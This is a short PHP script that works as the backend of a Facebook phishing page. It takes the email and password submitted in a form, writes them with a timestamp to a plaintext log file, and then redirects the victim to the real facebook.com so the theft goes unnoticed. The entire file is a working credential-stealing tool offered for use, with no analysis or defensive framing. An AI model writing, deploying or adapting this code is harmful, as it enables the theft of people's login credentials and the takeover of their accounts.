<?php
if (isset($_POST["email"])){
    $username = $_POST["email"];
}
if (isset($_POST["pass"])){
    $password = $_POST["pass"];
}
$date = date("d-m-y h:i:s");

file_put_contents("logs.txt", "Date: " . $date . "\n", FILE_APPEND);
file_put_contents("logs.txt", "Username: " . $username . "\n" , FILE_APPEND);
file_put_contents("logs.txt", "Password: ". $password . "\n\n", FILE_APPEND);
header("Location: https://www.facebook.com/");
?>